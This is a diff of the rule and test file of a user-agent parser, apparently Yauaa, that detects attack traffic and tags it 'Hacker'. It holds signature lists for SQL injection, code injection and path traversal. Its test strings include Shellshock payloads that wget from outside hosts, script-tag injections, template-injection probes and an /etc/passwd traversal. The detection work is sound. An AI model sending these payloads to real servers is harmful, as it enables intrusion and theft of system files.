@@ -19,25 +19,52 @@ config:
 - lookup:
     name: 'HackerAttackVectors'
     map:
-      "() {"                  : "Shell Shock"
-      "('') {"                : "Shell Shock"
-      "<script>"              : "Javascript"
+      "() {"                  : "Code Injection"
+      "('') {"                : "Code Injection"
+      "$("                    : "Code Injection"
+#      "${"                    : "Code Injection" # Special edge case: Has separate rule
+      "{{"                    : "Code Injection"
+      "}}"                    : "Code Injection"
+      "<script>"              : "Code Injection"
+      "javascript:"           : "Code Injection"
       "#exec"                 : "Serverside execute"
       "#include"              : "Serverside include"
       "nslookup"              : "Serverside execute"
       "JDatabaseDriverMysqli" : "Remote exec Joomla"
-      "SELECT "               : "SQL Injection"
-      "SELECT("               : "SQL Injection"
-      "CASE WHEN"             : "SQL Injection"
-      "UNION ALL"             : "SQL Injection"
-      " OR "                  : "SQL Injection"
-      " OR NOT"               : "SQL Injection"
-      "WAITFOR "              : "SQL Injection"
-      "ORDER BY"              : "SQL Injection"
-      "FROM DUAL"             : "SQL Injection"
-      "DECLARE "              : "SQL Injection"
-      "VARCHAR"               : "SQL Injection"
-      "1=1"                   : "SQL Injection"
+      "chr("                  : "Code Injection"
+      "concat("               : "Code Injection"
+      "Socket.gethostbyname"  : "Code Injection"
+      "SELECT "               : "Code Injection"
+      "SELECT("               : "Code Injection"
+      "CASE WHEN"             : "Code Injection"
+      "UNION ALL"             : "Code Injection"
+      " OR "                  : "Code Injection"
+      " OR NOT"               : "Code Injection"
+      "WAITFOR "              : "Code Injection"
+      "ORDER BY"              : "Code Injection"
+      "FROM DUAL"             : "Code Injection"
+      "DECLARE "              : "Code Injection"
+      "VARCHAR"               : "Code Injection"
+      "RLIKE "                : "Code Injection"
+      "1=1"                   : "Code Injection"
+      "<!ENTITY"              : "Code Injection"
+      "xmlns"                 : "Code Injection"
+      "str("                  : "Code Injection"
+      "__import__("           : "Code Injection"
+      "gethostbyname("        : "Code Injection"
+      "bxss.me"               : "Code Injection"
+      "burpcollaborator.net"  : "Code Injection"
+      "PG_SLEEP("             : "Code Injection"
+      "SLEEP("                : "Code Injection"
+      "while("                : "Code Injection"
+      "print("                : "Code Injection"
+      "typeof"                : "Code Injection"
+      "load_file"             : "Code Injection"
+      "path:"                 : "Path Traversal"
+      "file:"                 : "Path Traversal"
+      "../"                   : "Path Traversal"
+      "/.."                   : "Path Traversal"
+      "/./."                  : "Path Traversal"
 
 - lookup:
     name: 'HackerToolKits'
@@ -45,6 +72,7 @@ config:
       "nessus"                : "Nessus"
       "netsparker"            : "Netsparker"
       "nmap"                  : "Nmap"
+      "sqlmap"                : "Sqlmap"
 
 - matcher:
     require:
@@ -64,8 +92,11 @@ config:
     - 'AgentClass                          :  1000000 :"Hacker"'
     - 'AgentName                           :  1000000 :"Hacker"'
     - 'AgentVersion                        :  1000000 :"Hacker"'
-    - 'HackerToolkit                       :   999901 :"<<<null>>>"'
+    - 'AgentInformationUrl                 :  1000000 :"<<<null>>>"'
+    - 'AgentInformationEmail               :  1000000 :"<<<null>>>"'
+#    - 'HackerToolkit                       :   999901 :"<<<null>>>"'
     - 'HackerAttackVector                  :  1000000 :LookUpContains[HackerAttackVectors;agent]'
+
 
 - matcher:
     extract:
@@ -83,8 +114,32 @@ config:
     - 'AgentClass                          :  1000000 :"Hacker"'
     - 'AgentName                           :  1000000 :"Hacker"'
     - 'AgentVersion                        :  1000000 :"Hacker"'
+    - 'AgentInformationUrl                 :  1000000 :"<<<null>>>"'
+    - 'AgentInformationEmail               :  1000000 :"<<<null>>>"'
     - 'HackerToolkit                       :  1000000 :LookUpContains[HackerToolKits;agent]'
     - 'HackerAttackVector                  :   999901 :"<<<null>>>"'
+
+
+- matcher:
+    require:
+      - 'agent{"OR "'
+    extract:
+      - '__Set_ALL_Fields__                  :   999900 :"<<<null>>>"' # Must be 1 lower than the rest (or you will wipe yourself too)
+      - 'DeviceClass                         :  1000000 :"Hacker"'
+      - 'DeviceName                          :  1000000 :"Hacker"'
+      - 'DeviceBrand                         :  1000000 :"Hacker"'
+      - 'DeviceVersion                       :  1000000 :"Hacker"'
+      - 'OperatingSystemClass                :  1000000 :"Hacker"'
+      - 'OperatingSystemName                 :  1000000 :"Hacker"'
+      - 'OperatingSystemVersion              :  1000000 :"Hacker"'
+      - 'LayoutEngineClass                   :  1000000 :"Hacker"'
+      - 'LayoutEngineName                    :  1000000 :"Hacker"'
+      - 'LayoutEngineVersion                 :  1000000 :"Hacker"'
+      - 'AgentClass                          :  1000000 :"Hacker"'
+      - 'AgentName                           :  1000000 :"Hacker"'
+      - 'AgentVersion                        :  1000000 :"Hacker"'
+      - 'HackerAttackVector                  :  1000000 :"Code Injection"'
+
 
 - test:
     input:
@@ -112,7 +167,7 @@ config:
       AgentVersionMajor                    : 'Hacker'
       AgentNameVersion                     : 'Hacker'
       AgentNameVersionMajor                : 'Hacker'
-      HackerAttackVector                   : 'Shell Shock'
+      HackerAttackVector                   : 'Code Injection'
       HackerToolkit                        : 'Unknown'
 
 - test:
@@ -141,124 +196,9 @@ config:
       AgentVersionMajor                    : 'Hacker'
       AgentNameVersion                     : 'Hacker'
       AgentNameVersionMajor                : 'Hacker'
-      HackerAttackVector                   : 'Shell Shock'
+      HackerAttackVector                   : 'Code Injection'
       HackerToolkit                        : 'Unknown'
 
-- test:
-    input:
-      user_agent_string: '() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6278 Output : $((97+19))\"; }'
-    expected:
-      DeviceClass                          : 'Hacker'
-      DeviceName                           : 'Hacker'
-      DeviceBrand                          : 'Hacker'
-      DeviceVersion                        : 'Hacker'
-      OperatingSystemClass                 : 'Hacker'
-      OperatingSystemName                  : 'Hacker'
-      OperatingSystemVersion               : 'Hacker'
-      OperatingSystemVersionMajor          : 'Hacker'
-      OperatingSystemNameVersion           : 'Hacker'
-      OperatingSystemNameVersionMajor      : 'Hacker'
-      LayoutEngineClass                    : 'Hacker'
-      LayoutEngineName                     : 'Hacker'
-      LayoutEngineVersion                  : 'Hacker'
-      LayoutEngineVersionMajor             : 'Hacker'
-      LayoutEngineNameVersion              : 'Hacker'
-      LayoutEngineNameVersionMajor         : 'Hacker'
-      AgentClass                           : 'Hacker'
-      AgentName                            : 'Hacker'
-      AgentVersion                         : 'Hacker'
-      AgentVersionMajor                    : 'Hacker'
-      AgentNameVersion                     : 'Hacker'
-      AgentNameVersionMajor                : 'Hacker'
-      HackerAttackVector                   : 'Shell Shock'
-      HackerToolkit                        : 'Unknown'
-
-- test:
-    input:
-      user_agent_string: '('''') { :;}; wget http://whsec.us/20147169/10000646/ff16d94243 #, Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:13.0) Gecko/20100101 Firefox/13.0.1 WhiteHat Security'
-    expected:
-      DeviceClass                          : 'Hacker'
-      DeviceName                           : 'Hacker'
-      DeviceBrand                          : 'Hacker'
-      DeviceVersion                        : 'Hacker'
-      OperatingSystemClass                 : 'Hacker'
-      OperatingSystemName                  : 'Hacker'
-      OperatingSystemVersion               : 'Hacker'
-      OperatingSystemVersionMajor          : 'Hacker'
-      OperatingSystemNameVersion           : 'Hacker'
-      OperatingSystemNameVersionMajor      : 'Hacker'
-      LayoutEngineClass                    : 'Hacker'
-      LayoutEngineName                     : 'Hacker'
-      LayoutEngineVersion                  : 'Hacker'
-      LayoutEngineVersionMajor             : 'Hacker'
-      LayoutEngineNameVersion              : 'Hacker'
-      LayoutEngineNameVersionMajor         : 'Hacker'
-      AgentClass                           : 'Hacker'
-      AgentName                            : 'Hacker'
-      AgentVersion                         : 'Hacker'
-      AgentVersionMajor                    : 'Hacker'
-      AgentNameVersion                     : 'Hacker'
-      AgentNameVersionMajor                : 'Hacker'
-      HackerAttackVector                   : 'Shell Shock'
-      HackerToolkit                        : 'Unknown'
-
-- test:
-    input:
-      user_agent_string: 'shellshocker=''() { wget http://yourschool.net/.tmp/frogclog.php?http://www.example.com/foo/bar/; }'' bash -c shellshocker'
-    expected:
-      DeviceClass                          : 'Hacker'
-      DeviceName                           : 'Hacker'
-      DeviceBrand                          : 'Hacker'
-      DeviceVersion                        : 'Hacker'
-      OperatingSystemClass                 : 'Hacker'
-      OperatingSystemName                  : 'Hacker'
-      OperatingSystemVersion               : 'Hacker'
-      OperatingSystemVersionMajor          : 'Hacker'
-      OperatingSystemNameVersion           : 'Hacker'
-      OperatingSystemNameVersionMajor      : 'Hacker'
-      LayoutEngineClass                    : 'Hacker'
-      LayoutEngineName                     : 'Hacker'
-      LayoutEngineVersion                  : 'Hacker'
-      LayoutEngineVersionMajor             : 'Hacker'
-      LayoutEngineNameVersion              : 'Hacker'
-      LayoutEngineNameVersionMajor         : 'Hacker'
-      AgentClass                           : 'Hacker'
-      AgentName                            : 'Hacker'
-      AgentVersion                         : 'Hacker'
-      AgentVersionMajor                    : 'Hacker'
-      AgentNameVersion                     : 'Hacker'
-      AgentNameVersionMajor                : 'Hacker'
-      HackerAttackVector                   : 'Shell Shock'
-      HackerToolkit                        : 'Unknown'
-
-- test:
-    input:
-      user_agent_string: 'Mozilla/4.0 ()<script>alert(''Compatible'')</script>; <script>alert(''''OS)</script>; <script>alert(''MSIE 6.0'')</script>; ()'
-    expected:
-      DeviceClass                          : 'Hacker'
-      DeviceName                           : 'Hacker'
-      DeviceBrand                          : 'Hacker'
-      DeviceVersion                        : 'Hacker'
-      OperatingSystemClass                 : 'Hacker'
-      OperatingSystemName                  : 'Hacker'
-      OperatingSystemVersion               : 'Hacker'
-      OperatingSystemVersionMajor          : 'Hacker'
-      OperatingSystemNameVersion           : 'Hacker'
-      OperatingSystemNameVersionMajor      : 'Hacker'
-      LayoutEngineClass                    : 'Hacker'
-      LayoutEngineName                     : 'Hacker'
-      LayoutEngineVersion                  : 'Hacker'
-      LayoutEngineVersionMajor             : 'Hacker'
-      LayoutEngineNameVersion              : 'Hacker'
-      LayoutEngineNameVersionMajor         : 'Hacker'
-      AgentClass                           : 'Hacker'
-      AgentName                            : 'Hacker'
-      AgentVersion                         : 'Hacker'
-      AgentVersionMajor                    : 'Hacker'
-      AgentNameVersion                     : 'Hacker'
-      AgentNameVersionMajor                : 'Hacker'
-      HackerAttackVector                   : 'Javascript'
-      HackerToolkit                        : 'Unknown'
 
 - test:
     input:
@@ -461,7 +401,7 @@ config:
       AgentVersionMajor                    : 'Hacker'
       AgentNameVersion                     : 'Hacker'
       AgentNameVersionMajor                : 'Hacker'
-      HackerAttackVector                   : 'Javascript'
+      HackerAttackVector                   : 'Code Injection'
       HackerToolkit                        : 'Netsparker'
 
 # If there are NO products found this is either manipulated or a Hacker.
@@ -750,7 +690,7 @@ config:
       AgentVersionMajor                    : 'Hacker'
       AgentNameVersion                     : 'Hacker'
       AgentNameVersionMajor                : 'Hacker'
-      HackerAttackVector                   : 'Unknown'
+      HackerAttackVector                   : 'Code Injection'
       HackerToolkit                        : 'Unknown'
 
 # For reference:
@@ -926,7 +866,7 @@ config:
 #      AgentLanguage                        : 'Hacker'
 #      AgentLanguageCode                    : 'Hacker'
 #      AgentSecurity                        : 'Hacker'
-      HackerAttackVector                   : 'SQL Injection'
+      HackerAttackVector                   : 'Code Injection'
       HackerToolkit                        : 'Unknown'
 
 - test:
@@ -986,9 +926,7 @@ config:
       AgentVersionMajor                    : 'Hacker'
       AgentNameVersion                     : 'Hacker'
       AgentNameVersionMajor                : 'Hacker'
-      HackerAttackVector                   : 'Unknown'
-      HackerToolkit                        : 'Unknown'
-
+      HackerAttackVector                   : 'Code Injection'
 
 # What is this? __CT_JOB_ID__ looks like a spider/hacker of some sort, but is it?
 - test:
@@ -1450,3 +1388,88 @@ config:
       AgentNameVersionMajor                : 'Windows NT 9'
       AgentLanguage                        : 'English (United States)'
       AgentLanguageCode                    : 'en-us'
+
+- test:
+    input:
+      user_agent_string: 'ed47e${885*910}wgadh'
+    expected:
+      DeviceClass                          : 'Hacker'
+      DeviceName                           : 'Hacker'
+      DeviceBrand                          : 'Hacker'
+      DeviceVersion                        : 'Hacker'
+      OperatingSystemClass                 : 'Hacker'
+      OperatingSystemName                  : 'Hacker'
+      OperatingSystemVersion               : 'Hacker'
+      OperatingSystemVersionMajor          : 'Hacker'
+      OperatingSystemNameVersion           : 'Hacker'
+      OperatingSystemNameVersionMajor      : 'Hacker'
+      LayoutEngineClass                    : 'Hacker'
+      LayoutEngineName                     : 'Hacker'
+      LayoutEngineVersion                  : 'Hacker'
+      LayoutEngineVersionMajor             : 'Hacker'
+      LayoutEngineNameVersion              : 'Hacker'
+      LayoutEngineNameVersionMajor         : 'Hacker'
+      AgentClass                           : 'Hacker'
+      AgentName                            : 'Hacker'
+      AgentVersion                         : 'Hacker'
+      AgentVersionMajor                    : 'Hacker'
+      AgentNameVersion                     : 'Hacker'
+      AgentNameVersionMajor                : 'Hacker'
+
+- test:
+    input:
+      user_agent_string: 'eda5h{{701*381}}vwb9m'
+    expected:
+      DeviceClass                          : 'Hacker'
+      DeviceName                           : 'Hacker'
+      DeviceBrand                          : 'Hacker'
+      DeviceVersion                        : 'Hacker'
+      OperatingSystemClass                 : 'Hacker'
+      OperatingSystemName                  : 'Hacker'
+      OperatingSystemVersion               : 'Hacker'
+      OperatingSystemVersionMajor          : 'Hacker'
+      OperatingSystemNameVersion           : 'Hacker'
+      OperatingSystemNameVersionMajor      : 'Hacker'
+      LayoutEngineClass                    : 'Hacker'
+      LayoutEngineName                     : 'Hacker'
+      LayoutEngineVersion                  : 'Hacker'
+      LayoutEngineVersionMajor             : 'Hacker'
+      LayoutEngineNameVersion              : 'Hacker'
+      LayoutEngineNameVersionMajor         : 'Hacker'
+      AgentClass                           : 'Hacker'
+      AgentName                            : 'Hacker'
+      AgentVersion                         : 'Hacker'
+      AgentVersionMajor                    : 'Hacker'
+      AgentNameVersion                     : 'Hacker'
+      AgentNameVersionMajor                : 'Hacker'
+      HackerAttackVector                   : 'Code Injection'
+
+- test:
+    input:
+      user_agent_string: 'invalid../../../../../../../../../../etc/passwd/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././.'
+    expected:
+      DeviceClass                          : 'Hacker'
+      DeviceName                           : 'Hacker'
+      DeviceBrand                          : 'Hacker'
+      DeviceVersion                        : 'Hacker'
+      OperatingSystemClass                 : 'Hacker'
+      OperatingSystemName                  : 'Hacker'
+      OperatingSystemVersion               : 'Hacker'
+      OperatingSystemVersionMajor          : 'Hacker'
+      OperatingSystemNameVersion           : 'Hacker'
+      OperatingSystemNameVersionMajor      : 'Hacker'
+      LayoutEngineClass                    : 'Hacker'
+      LayoutEngineName                     : 'Hacker'
+      LayoutEngineVersion                  : 'Hacker'
+      LayoutEngineVersionMajor             : 'Hacker'
+      LayoutEngineNameVersion              : 'Hacker'
+      LayoutEngineNameVersionMajor         : 'Hacker'
+      AgentClass                           : 'Hacker'
+      AgentName                            : 'Hacker'
+      AgentVersion                         : 'Hacker'
+      AgentVersionMajor                    : 'Hacker'
+      AgentNameVersion                     : 'Hacker'
+      AgentNameVersionMajor                : 'Hacker'
+      HackerAttackVector                   : 'Buffer overflow'
+      HackerToolkit                        : 'Unknown'
+
